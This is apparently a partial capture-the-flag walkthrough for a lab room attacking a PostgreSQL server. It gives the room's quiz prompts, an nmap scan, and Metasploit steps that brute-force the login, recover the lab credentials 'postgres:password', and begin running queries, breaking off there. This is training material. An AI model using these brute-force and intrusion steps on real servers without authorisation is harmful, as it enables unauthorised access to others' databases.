# Poster
The sys admin set up a rdbms in a safe way.

Task 1
Flag

Start Machine
What is rdbms?

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.

Are you able to complete the challenge?
The machine may take up to 5 minutes to boot and configure
Answer the questions below
What is the rdbms installed on the server?
Answer format: **********

Check
What port is the rdbms running on?

Answer format: ****

Check
Metasploit contains a variety of modules that can be used to enumerate in multiple rdbms, making it easy to gather valuable information.

No answer needed

Check
After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

Answer format: *********/*******/********/********_*****

Check
What are the credentials you found?

example: user:password

Answer format: ********:********

Check
What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?

Answer format: *********/*****/********/********_***

Check
Based on the results of #6, what is the rdbms version installed on the server?

Answer format: *.*.**

Check
What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

Answer format: *********/*******/********/********_********

Check
How many user hashes does the module dump?

Answer format: *

Check
What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?

Answer format: *********/*****/********/********_********

Check
What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

Answer format: *******/*****/********/********_****_****_*******_***_****

Check
Compromise the machine and locate user.txt

Answer format: ***{**********_****_*************}

Check

Escalate privileges and obtain root.txt

Answer format: ***{********_***_****_***_****_****_***********}


## Initial Enemurtaion

Let start with nmap scan to identify the running service

```
~$ nmap -sV -sC -Pn 10.49.129.49
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-17 20:34 IST
Nmap scan report for 10.49.129.49
Host is up (0.027s latency).
Not shown: 659 closed tcp ports (conn-refused), 340 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
```
there are only one services is running
* `postgresql` on port `5432`


## Finding Vulneribality

So let use metasploit auxiliary to scan this rdbms for some vulnerability
>  msfconsole -q
> search auxiliary postgresql

we can see the listed auxilaryers here 
LEt use number 4 auxiliary/scanner/postgres/postgres_login that says `PostgreSQL Login Utility` basically this try to bruteforce the postgre
<img width="1742" height="425" alt="image" src="https://github.com/user-attachments/assets/36f6bd06-470b-4bbe-aa78-4e3dfde719f9" />

Let use this to use this:
> use 4

let see what are the configs 
> show config
as it says we only need to mention our rhost ip
> set RHOSTS <ip>

<img width="1898" height="915" alt="image" src="https://github.com/user-attachments/assets/63c073e9-e7a9-49ae-9016-12d3954318a2" />

Let run this using cmd
> run

<img width="1330" height="604" alt="image" src="https://github.com/user-attachments/assets/4a70ed09-9b11-4b8f-866c-dfe9d9456e41" />
We got the creds `postgres:password`

Now we have to find the module that allows us to execute commands with the proper user credentials.

Let search for auxilary again
> search auxilary postgresql

<img width="1722" height="472" alt="image" src="https://github.com/user-attachments/assets/48ea0b67-a19b-41e7-a489-330b59e24b03" />
we can use this one auxiliary/admin/postgres/postgres_sql as it said `PostgreSQL Server Generic Query`

So we have to set rhost and password to set we can do
> set RHOSTS <IP>
> set Password password
> run

